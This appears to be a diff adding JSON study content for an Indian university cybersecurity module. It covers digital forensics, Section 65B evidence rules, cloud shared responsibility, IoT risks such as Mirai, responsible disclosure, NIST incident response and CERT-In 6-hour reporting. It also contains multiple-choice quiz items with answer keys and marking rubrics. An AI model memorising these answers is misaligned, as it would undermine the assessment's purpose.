+          "sub": "Maintaining Evidentiary Integrity and Certification under the Indian Evidence Act",
+          "plain": "Chain of custody is a chronological log documenting who touched the evidence, when, and why. If the chain breaks, the court throws the evidence out. In India, Section 65B of the Evidence Act requires a signed certificate proving electronic records are authentic.",
+          "def": "Chain of Custody is the meticulous, unbroken chronological documentation tracking the custody, control, transfer, analysis, and disposition of physical and electronic evidence from collection to courtroom presentation. Under Section 65B of the Indian Evidence Act 1872 (and corresponding provisions in Bharatiya Sakshya Adhiniyam), electronic records (emails, server logs, CCTV footage) are legally inadmissible in court unless accompanied by an official Section 65B Certificate signed by a person occupying a responsible official position in relation to the operation of the computer device, certifying the device was operating properly and without tampering.",
+          "exam": "A break in the Chain of Custody renders evidence inadmissible in court. Section 65B Certificate is MANDATORY for secondary electronic evidence per the Supreme Court Arjun Panditrao (2020) ruling.",
+          "trap": "Exam Trap: Believing printing out an email or server log makes it admissible paper evidence. Under Indian law, printed electronic records remain secondary electronic evidence and are strictly inadmissible without a Section 65B certificate!",
+          "example": "A cyber investigator submits server intrusion logs to a high court accompanied by an evidence transfer log (Chain of Custody) and a signed Section 65B certificate confirming the SIEM server operated normally without clock drift.",
+          "q": "What is the legal purpose of a Chain of Custody form in digital forensics, and what consequence arises if the chain is broken?",
+          "a": "Chain of custody documents the chronological possession and handling of evidence to prove it was not tampered with, swapped, or contaminated. If the chain of custody is broken, the court deems the evidence unreliable and legally inadmissible."
+        },
+        {
+          "id": "cyber_m5_forensic_imaging_hash_integrity",
+          "cat": "Digital Forensics",
+          "title": "FORENSIC IMAGING, WRITE BLOCKERS, AND HASH INTEGRITY",
+          "sub": "Bit-Stream Copying vs Logical File Copies and Cryptographic Verification",
+          "plain": "Never investigate the original hard drive! Always make a bit-by-bit clone using a write-blocker (which stops your computer from altering timestamps). You hash the original and the clone with SHA-256; if the hashes match, the clone is legally identical.",
+          "def": "Forensic Acquisition requires creating a Bit-Stream Image (exact physical sector-by-sector clone, copying allocated space, unallocated space, slack space, and swap) rather than a simple logical copy (which only copies visible files). A Hardware Write Blocker is physically attached to the original media to prevent the host operating system from writing metadata, mounting volumes, or altering access timestamps. Integrity Verification requires calculating cryptographic hashes (MD5 and SHA-256) of the original source disk and the target image; identical hashes prove bit-for-bit authenticity in court.",
+          "exam": "Logical copy = copies only active visible files (useless for recovering deleted data). Bit-stream physical image = copies every single sector (captures unallocated slack space where deleted files hide).",
+          "trap": "Exam Trap: Simply copying and pasting files using Windows File Explorer. Doing so modifies access timestamps (MAC times), writes desktop cache files, and fails to capture deleted file fragments, corrupting forensic evidence!",
+          "example": "An investigator connects a suspect's SATA drive through a Tableau hardware write-blocker, executes `dd if=/dev/sdb of=evidence.raw bs=4096 conv=noerror,sync`, and confirms the SHA-256 digest matches the physical disk exactly.",
+          "q": "Why must digital forensic investigators use a hardware write-blocker when acquiring an image of a suspect's storage drive?",
+          "a": "A hardware write-blocker permits read commands while intercepting and discarding all write commands from the forensic workstation's operating system, ensuring that drive metadata, file access timestamps, and disk contents remain 100% unaltered."
+        },
+        {
+          "id": "cyber_m5_cloud_security_shared_responsibility",
+          "cat": "Cloud Security",
+          "title": "CLOUD SECURITY SHARED RESPONSIBILITY MODEL",
+          "sub": "Demarcation of Security Duties Across IaaS, PaaS, and SaaS Tiers",
+          "plain": "In the cloud, security is shared between you and the provider. In IaaS, the cloud provider secures the physical hardware and hypervisor, but you must secure the OS, firewalls, and data. In SaaS, the provider manages everything except your user credentials and data access.",
+          "def": "The Shared Responsibility Model defines the distinct cybersecurity obligations divided between the Cloud Service Provider (CSP) and the customer: 1. Infrastructure as a Service (IaaS): CSP secures physical datacenters, virtualization, and host hardware; customer is responsible for guest OS patching, networking, firewalls, IAM, applications, and data. 2. Platform as a Service (PaaS): CSP manages physical hardware, OS, and runtime environments; customer manages application code and data. 3. Software as a Service (SaaS): CSP manages the entire stack; customer is solely responsible for identity access, data classification, and endpoint credentials.",
+          "exam": "Golden rule across ALL cloud models (IaaS, PaaS, SaaS): The CUSTOMER is ALWAYS responsible for data classification, data governance, and user access management (identities and credentials)!",
+          "trap": "Exam Trap: Believing that moving to AWS or Azure IaaS automatically makes your servers secure. If you leave open ports, unpatched Linux kernels, or default passwords on an IaaS virtual machine, it is 100% the customer's fault and responsibility!",
+          "example": "A company leaves an AWS S3 bucket publicly readable with sensitive customer records. AWS is not liable because bucket permission configuration is strictly customer responsibility under the shared responsibility model.",
+          "q": "Under the Cloud Shared Responsibility Model, what are the customer's responsibilities versus the Cloud Service Provider's responsibilities in Infrastructure as a Service (IaaS)?",
+          "a": "The CSP is responsible for 'Security OF the Cloud' (physical datacenters, host hardware, and virtualization hypervisor). The customer is responsible for 'Security IN the Cloud' (guest OS patching, network firewall rules, middleware, application code, IAM, and data)."
+        },
+        {
+          "id": "cyber_m5_iot_security_challenges",
+          "cat": "IoT Security",
+          "title": "INTERNET OF THINGS (IOT) SECURITY CHALLENGES",
+          "sub": "Constrained Computing, Insecure Firmware, Default Passwords, and Botnets",
+          "plain": "Smart bulbs, cameras, and sensors often have zero security: hardcoded passwords like 'admin:admin', unencrypted communications, and no way to update firmware. Hackers scan the internet to hijack millions of these devices into massive botnets.",
+          "def": "The Internet of Things (IoT) encompasses interconnected embedded devices equipped with sensors, processing power, and network connectivity. Core Security Challenges: 1. Resource Constraints: Minimal CPU and RAM limit the ability to execute robust asymmetric cryptography or endpoint agents. 2. Insecure Defaults: Factory-shipped hardcoded credentials (e.g., Telnet `admin:admin`) that cannot be changed. 3. Firmware Vulnerabilities & Lack of Patching: Devices lack secure Over-The-Air (OTA) update mechanisms. 4. Physical Exposure: Devices deployed in remote, unmonitored locations susceptible to hardware tampering.",
+          "exam": "Case study: The Mirai botnet (2016) scanned the internet for open Telnet ports (port 23) using a dictionary of just 61 default factory credentials, enslaving over 600,000 IoT cameras to launch massive record-breaking DDoS attacks.",
+          "trap": "Exam Trap: Assuming IoT devices are harmless because 'it is just a smart thermometer.' Compromised low-value IoT devices provide an immediate internal foothold for attackers to pivot laterally across the network into core databases!",
+          "example": "Hackers breached a North American casino's high-roller database by first compromising an internet-connected smart fish tank thermometer that had default factory credentials and unsegmented network access.",
+          "q": "What architectural and hardware constraints make securing Internet of Things (IoT) devices significantly more challenging than securing traditional enterprise servers?",
+          "a": "IoT devices possess severely limited CPU processing power, battery life, and memory, making complex cryptographic ciphers and endpoint security agents infeasible; they often lack secure firmware update mechanisms and ship with unchangeable hardcoded factory credentials."
+        },
+        {
+          "id": "cyber_m5_cyber_ethics_responsible_disclosure",
+          "cat": "Cyber Ethics",
+          "title": "CYBER ETHICS, ETHICAL HACKING, AND RESPONSIBLE DISCLOSURE",
+          "sub": "White-Hat Principles, Bug Bounty Programs, and Coordinated Vulnerability Disclosure",
+          "plain": "Ethical hackers use their skills to protect systems, not harm them. Responsible disclosure means when a security researcher finds a vulnerability, they report it privately to the company and give them reasonable time to patch it before publishing it to the world.",
+          "def": "Cyber Ethics establishes the moral and legal framework governing professional behavior in computing. Hacker Classifications: White-Hat (authorized ethical security researchers), Black-Hat (unauthorized malicious adversaries), and Gray-Hat (acts without prior authorization but without malicious intent). Coordinated / Responsible Vulnerability Disclosure mandates that researchers notify the affected vendor privately, providing a reasonable remediation window (typically 90 days per industry standards) before publishing a public advisory, protecting end users from zero-day exploitation.",
+          "exam": "Key tenets of Ethical Hacking: 1. Written authorization / Rules of Engagement before testing. 2. Respect privacy and protect data confidentiality. 3. Do no harm (avoid service disruptions). 4. Promptly disclose findings to the system owner.",
+          "trap": "Exam Trap: Finding a security flaw and immediately posting it on Twitter/Reddit to 'force the company to fix it.' This is called Full Disclosure or Zero-Day dropping, which arms cybercriminals and violates responsible disclosure ethics!",
+          "example": "A security researcher discovers an authentication bypass in an airline booking portal, confidentially submits the technical report through the airline's HackerOne bug bounty program, receives a bounty, and publishes an advisory only after the patch is deployed.",
+          "q": "What is 'Responsible Vulnerability Disclosure', and why is it considered the ethical gold standard over 'Full Disclosure'?",
+          "a": "Responsible disclosure gives the affected vendor a confidential advance period (typically 90 days) to develop and deploy a security patch before publishing details publicly. Full disclosure immediately publishes the flaw to the world without a patch, exposing all users to instant exploitation."
+        },
+        {
+          "id": "cyber_m5_incident_response_nist",
+          "cat": "Incident Response",
+          "title": "INCIDENT RESPONSE LIFECYCLE (NIST SP 800-61)",
+          "sub": "Preparation, Detection, Containment, Eradication, Recovery, and Lessons Learned",
+          "plain": "When a breach happens, panic is the enemy. The NIST Incident Response lifecycle provides a battle-tested playbook: Prepare beforehand, Detect and analyze the attack, Contain it so it can't spread, Eradicate the root cause, Recover systems safely, and Learn from the incident.",
+          "def": "Computer Security Incident Response is an organized approach to addressing and managing the aftermath of a security breach or cyberattack. NIST SP 800-61 defines the 4-phase Incident Response Lifecycle: 1. Preparation (establishing incident response team, tools, playbooks, communication channels). 2. Detection and Analysis (triaging alerts, correlating SIEM logs, determining attack vectors). 3. Containment, Eradication, and Recovery (short-term/long-term containment, wiping malware, patching vulnerabilities, restoring from clean backups). 4. Post-Incident Activity (Lessons Learned meeting, updating documentation).",
+          "exam": "Phases in order: 1. Preparation. 2. Detection & Analysis. 3. Containment, Eradication & Recovery. 4. Post-Incident Activity (Lessons Learned). Containment prevents lateral spread; Eradication removes malware; Recovery restores normal service.",
+          "trap": "Exam Trap: Skipping the Post-Incident Activity (Lessons Learned) phase. Without a formal post-mortem meeting to identify root causes and update defensive controls, organizations inevitably fall victim to the exact same attack vector again.",
+          "example": "During a malware outbreak, the CSIRT team isolates the infected VLAN (Containment), rebuilds compromised servers from known good golden images (Eradication), restores databases from clean offline backups (Recovery), and implements new EDR rules (Lessons Learned).",
+          "q": "Name the four core phases of the Incident Response Lifecycle as defined by NIST SP 800-61.",
+          "a": "1. Preparation. 2. Detection and Analysis. 3. Containment, Eradication, and Recovery. 4. Post-Incident Activity (Lessons Learned)."
+        },
+        {
+          "id": "cyber_m5_critical_infrastructure_cert_in",
+          "cat": "Governance",
+          "title": "CRITICAL INFORMATION INFRASTRUCTURE AND CERT-IN DIRECTIVES",
+          "sub": "National Cyber Defense, NCIIPC, and Mandatory 6-Hour Incident Reporting",
+          "plain": "Critical infrastructure includes systems so vital that their destruction would cripple national security, like power grids and banking networks. In India, CERT-In is the national agency responding to cyber threats and mandates that companies report major cyber incidents within 6 hours.",
+          "def": "Critical Information Infrastructure (CII), defined under Section 70 of the IT Act 2000, refers to computer systems whose incapacitation or destruction would have debilitating impacts on national security, economy, public health, or safety. The National Critical Information Infrastructure Protection Centre (NCIIPC) is the national nodal agency for CII defense. The Indian Computer Emergency Response Team (CERT-In), operating under Section 70B, issued cybersecurity directives mandating that all service providers, corporations, and intermediaries MUST report specified cyber incidents (e.g., ransomware, unauthorized access, data leaks) to CERT-In within 6 hours of notice.",
+          "exam": "Important numbers to remember for ASTU exams: Section 70 = Critical Information Infrastructure (NCIIPC). Section 70B = CERT-In. CERT-In mandatory incident reporting window = within 6 HOURS! Unauthorized access to a protected system under Section 70 carries up to 10 years imprisonment.",
+          "trap": "Exam Trap: Believing companies have 72 hours to report cyber incidents in India. Under the 2022 CERT-In directions, cybersecurity incidents must be reported within 6 HOURS (much stricter than the EU GDPR 72-hour window)!",
+          "example": "An Indian commercial bank discovers an active ransomware encryption event on its core banking servers at 10:00 AM; under CERT-In directives, the bank must formally notify CERT-In before 4:00 PM on the same day.",
+          "q": "Under the 2022 cybersecurity directions issued by CERT-In (Section 70B of the IT Act), what is the mandatory time window within which organizations must report cybersecurity incidents?",
+          "a": "Organizations must mandatorily report cybersecurity incidents to CERT-In within 6 hours of noticing the incident or being brought to notice."
+        }
+      ],
+      "quiz": [
+        {
+          "q": "A cybercrime group operating from a foreign nation orchestrates a ransomware attack targeting a public power utility in Guwahati, Assam. Does the Indian Information Technology Act 2000 apply to these foreign hackers?",
+          "opts": [
+            "No, because Indian legislation has zero legal force outside Indian territorial borders",
+            "Yes, under Section 75, the IT Act possesses extraterritorial jurisdiction over any person regardless of nationality if the targeted computer resource is located in India",
+            "No, the IT Act only applies to foreign nationals if they physically entered India on a tourist visa",
+            "Only if the foreign country's government gives prior written permission"
+          ],
+          "ans": 1,
+          "cat": "Cyber Law",
+          "correctFb": "Section 75 of the Information Technology Act 2000 explicitly provides extraterritorial jurisdiction: it applies to any offense committed outside India by any person, regardless of nationality, if the computer system or network involved is located in India.",
+          "distractors": [
+            "Section 75 explicitly establishes extraterritorial legal applicability for cybercrimes targeting Indian infrastructure.",
+            "Physical entry on a visa is not a prerequisite for Section 75 extraterritorial jurisdiction.",
+            "Extraterritorial statutory applicability in Indian courts does not require foreign executive approval."
+          ]
+        },
+        {
+          "q": "What is the primary legal distinction between Section 43 and Section 66 of the Information Technology Act 2000?",
+          "opts": [
+            "Section 43 applies only to smart televisions, whereas Section 66 applies to mainframes",
+            "Section 43 provides for civil liability and monetary compensation to the victim, whereas Section 66 imposes criminal liability with imprisonment for dishonest or fraudulent hacking",
+            "Section 43 carries a life sentence, whereas Section 66 carries a nominal ₹50 fine",
+            "Section 43 was struck down as unconstitutional by the Supreme Court"
+          ],
+          "ans": 1,
+          "cat": "Cyber Law",
+          "correctFb": "Section 43 establishes civil liability and monetary damages payable to victims for unauthorized system access and contamination. When acts in Section 43 are committed dishonestly or fraudulently, they become criminal offenses under Section 66, carrying up to 3 years imprisonment.",
+          "distractors": [
+            "The IT Act covers all computer systems, networks, and electronic devices universally.",
+            "Section 43 is a civil remedy with no prison sentence; Section 66 carries up to 3 years imprisonment.",
+            "Section 66A was struck down in Shreya Singhal (2015); Section 43 and Section 66 remain fully active laws."
+          ]
+        },
+        {
+          "q": "Under Section 66F of the Information Technology Act 2000, what is the maximum punishment prescribed for the offense of Cyber Terrorism against the sovereignty and integrity of India?",
+          "opts": [
+            "A monetary fine of ₹50,000 only",
+            "Imprisonment for life",
+            "Community service for six months",
+            "Rigorous imprisonment up to one year"
+          ],
+          "ans": 1,
+          "cat": "Cyber Law",
+          "correctFb": "Section 66F of the IT Act penalizes Cyber Terrorism—acts that threaten the unity, integrity, security, or sovereignty of India or strike terror in people by denying access to computer resources. It carries a statutory penalty of imprisonment for life.",
+          "distractors": [
+            "Cyber terrorism is a severe national security felony and cannot be compounded with a simple fine.",
+            "Community service is not a statutory sentencing disposition under the IT Act.",
+            "One year is far below the statutory life imprisonment penalty mandated by Section 66F."
+          ]
+        },
+        {
+          "q": "Under Section 65B of the Indian Evidence Act 1872, what is legally required for electronic records (such as printouts, server logs, or emails) to be admissible as secondary evidence in a court of law?",
+          "opts": [
+            "The hard drives must be physically melted in court",
+            "A signed Certificate of Authenticity executed by a person occupying a responsible official position in relation to the relevant computer device",
+            "A verbal testimony from any internet service provider employee",
+            "Electronic records are strictly inadmissible in Indian courts under all circumstances"
+          ],
+          "ans": 1,
+          "cat": "Digital Forensics",
+          "correctFb": "Under Section 65B(4), secondary electronic evidence is legally inadmissible unless accompanied by a written certificate signed by a person occupying a responsible official position, certifying that the computer was operating properly and that the data is authentic.",
+          "distractors": [
+            "Physical destruction of evidence is a criminal offense (destruction of evidence) under Section 204 IPC.",
+            "Verbal oral testimony cannot substitute for a mandatory written Section 65B certificate.",
+            "Electronic records are fully admissible under Indian law provided the procedural mandates of Section 65B are satisfied."
+          ]
+        },
+        {
+          "q": "According to the Order of Volatility in digital evidence acquisition (RFC 3227), which of the following evidence sources must be collected first before powering off a machine?",
+          "opts": [
+            "Hard disk optical storage drives",
+            "Registers and CPU cache, followed by main system memory (RAM)",
+            "Archival tape backups stored offsite",
+            "Printed network architecture diagrams"
+          ],
+          "ans": 1,
+          "cat": "Digital Forensics",
+          "correctFb": "The Order of Volatility dictates that the most ephemeral, volatile data must be captured first: CPU registers and cache, followed by routing tables, ARP cache, and main system memory (RAM), before non-volatile hard disks.",
+          "distractors": [
+            "Hard disk magnetic/optical storage is non-volatile and persists after power-down.",
+            "Archival backup tapes are long-term non-volatile storage and can be examined days later.",
+            "Paper diagrams are static physical documents with zero digital volatility."
+          ]
+        },
+        {
+          "q": "Why is a Bit-Stream Disk Image (physical sector-by-sector clone) required in digital forensics rather than a standard logical file copy (like drag-and-drop)?",
+          "opts": [
+            "A bit-stream image takes 10 times less hard drive space",
+            "A bit-stream image captures all unallocated space, slack space, and deleted file fragments that are ignored by a logical copy",
+            "A logical copy automatically encrypts all files with military-grade AES-256",
+            "Bit-stream copying is only possible on mobile phones, not on desktop computers"
+          ],
+          "ans": 1,
+          "cat": "Digital Forensics",
+          "correctFb": "A bit-stream disk image copies every physical sector sequentially, including unallocated space, slack space, and swap files where deleted evidence and hidden data reside. A logical copy only copies currently visible active files.",
+          "distractors": [
+            "A bit-stream image is equal in size to the entire capacity of the source physical disk.",
+            "Logical copies do not perform encryption; they simply copy files using the OS file manager.",
+            "Bit-stream imaging is standard across hard drives, SSDs, USB drives, servers, and mobile devices."
+          ]
+        },
+        {
+          "q": "Under the Cloud Security Shared Responsibility Model, which party is primarily responsible for securing the physical servers, datacenter facilities, and virtualization hypervisor in an IaaS environment?",
+          "opts": [
+            "The enterprise customer's internal desktop support team",
+            "The Cloud Service Provider (e.g., AWS, Microsoft Azure, Google Cloud)",
+            "The regional telecom fiber optic contractor",
+            "The end-user accessing the web application from an iPhone"
+          ],
+          "ans": 1,
+          "cat": "Cloud Security",
+          "correctFb": "In the Shared Responsibility Model, the Cloud Service Provider (CSP) is exclusively responsible for 'Security OF the Cloud'—encompassing physical datacenter security, power, heating, physical servers, and the virtualization hypervisor.",
+          "distractors": [
+            "The customer's internal team manages guest operating systems and application configurations, not physical datacenters.",
+            "Telecom carriers provide transit bandwidth, not cloud virtualization security.",
+            "End-users manage their personal client devices, not cloud server infrastructure."
+          ]
+        },
+        {
+          "q": "What primary attack vector did the Mirai botnet exploit to compromise and enslave hundreds of thousands of Internet of Things (IoT) devices in 2016?",
+          "opts": [
+            "Advanced quantum cryptanalysis breaking 4096-bit RSA keys",
+            "Automated scanning for open Telnet ports paired with a dictionary of 61 default factory-shipped credentials",
+            "Physical micro-probing of silicon chips in electronic factories",
+            "Exploiting buffer overflows in quantum satellites"
+          ],
+          "ans": 1,
+          "cat": "IoT Security",
+          "correctFb": "The Mirai botnet scanned the public internet for open Telnet and SSH management ports on IoT devices (cameras, DVRs, routers) and brute-forced them using a hardcoded list of just 61 factory default username/password pairs.",
+          "distractors": [
+            "Mirai utilized trivial unauthenticated credential brute-forcing, not quantum cryptanalysis.",
+            "Mirai operated purely over IP networks without physical chip tampering.",
+            "Satellites were not involved; consumer IoT cameras and home routers were the primary targets."
+          ]
+        },
+        {
+          "q": "Under the 2022 cybersecurity directions issued by CERT-In under Section 70B of the IT Act, what is the mandatory timeframe for organizations to report specified cybersecurity incidents?",
+          "opts": [
+            "Within 30 calendar days",
+            "Within 6 hours of noticing the incident",
+            "Within 72 hours of incident resolution",
+            "Annually during the company's financial audit"
+          ],
+          "ans": 1,
+          "cat": "Governance",
+          "correctFb": "The Indian Computer Emergency Response Team (CERT-In) directions mandate that all service providers, intermediaries, data centers, and corporate bodies must report specified cybersecurity incidents to CERT-In within 6 hours of notice.",
+          "distractors": [
+            "30 days is common for long-term audit reports, but violates incident disclosure rules.",
+            "72 hours is the European Union GDPR personal data breach reporting timeline, not Indian CERT-In.",
+            "Annual reporting applies to financial taxes, not active cybersecurity incident mitigation."
+          ]
+        },
+        {
+          "q": "What is the primary operational objective of the 'Lessons Learned' phase in the NIST SP 800-61 Incident Response Lifecycle?",
+          "opts": [
+            "To publicly identify and fire the system administrator responsible for the initial vulnerability",
+            "To evaluate how effectively the response team handled the incident, identify operational gaps, and update security controls to prevent recurrence",
+            "To calculate the total monetary ransom to pay to the attackers",
+            "To permanently disable all network monitoring tools to reduce logging costs"
+          ],
+          "ans": 1,
+          "cat": "Incident Response",
+          "correctFb": "The Post-Incident Activity (Lessons Learned) phase conducts a blameless post-mortem analysis to evaluate what occurred, why it occurred, how well the team responded, and what defensive controls and playbooks must be updated to prevent recurrence.",
+          "distractors": [
+            "Blameless post-mortems focus on process, architectural, and systemic improvement rather than punitive action.",
+            "Incident response frameworks strictly emphasize containment and recovery rather than paying extortion.",
+            "Disabling monitoring directly contradicts the objective of strengthening detection capabilities."
+          ]
+        }
+      ],
+      "bossChallenges": [
+        {
+          "marks": 10,
+          "scenario": "A financial institution in Assam experiences a severe cyber incident: an external hacker penetrates internal networks, alters client account balances, and exfiltrates confidential transactional databases to a server in Europe. Law enforcement and the digital forensics team are summoned. Structure an exhaustive investigation and legal report: map out the digital forensic investigation lifecycle (preservation with write-blockers, bit-stream imaging, hash verification), formulate the Chain of Custody requirements and Section 65B certification under the Indian Evidence Act, and identify all applicable penal sections under the Information Technology Act 2000 (Sections 43, 66, 66C, 66F, and 75).",
+          "rubric": [
+            "Digital Forensics Acquisition Rigor (2.5 marks): Complete procedural description of live RAM capture, hardware write-blocker usage, bit-stream disk imaging (dd/E01), and MD5/SHA-256 integrity verification.",
+            "Chain of Custody & Evidence Admissibility (2.5 marks): Comprehensive documentation of evidence handling logs and full legal compliance with Section 65B of the Indian Evidence Act.",
+            "Statutory Mapping under IT Act 2000 (2.5 marks): Accurate legal application of Section 43 (civil damages), Section 66 (hacking), Section 66C (identity theft), Section 66F (cyber terrorism if critical financial infrastructure is compromised), and Section 75 (extraterritorial jurisdiction).",
+            "Forensic Pitfalls & Anti-Forensics Countermeasures (2.5 marks): Critical analysis of anti-forensic techniques (timestomping, disk wiping) and how to avoid evidence contamination during triage."
+          ]
+        },
+        {
+          "marks": 5,
+          "scenario": "A healthcare cloud provider hosting electronic medical records across an IaaS environment suffers an unauthorized data exfiltration event. The board of directors is confused regarding legal liability, incident reporting deadlines, and cloud responsibilities. Clarify the Cloud Security Shared Responsibility Model for IaaS, and provide a compliance roadmap specifying the mandatory CERT-In 6-hour incident notification protocol and NIST containment phases.",
+          "rubric": [
+            "Cloud Shared Responsibility Demarcation (1.25 marks): Explicitly defining the boundary between the CSP's physical/hypervisor duties and the customer's OS/data/IAM responsibilities.",
+            "Regulatory Notification under CERT-In (1.25 marks): Detailing the mandatory 6-hour reporting window under Section 70B of the IT Act 2000.",
+            "Incident Containment & Evidence Triage (1.25 marks): Formulating rapid network micro-segmentation and forensic memory capture without disrupting active life-safety clinical monitors.",
+            "Root Cause Remediation & Governance (1.25 marks): Conducting a post-incident lessons learned review and implementing multi-factor authentication and data encryption at rest."
+          ]
+        }
+      ]
+    }
+  ]
+}
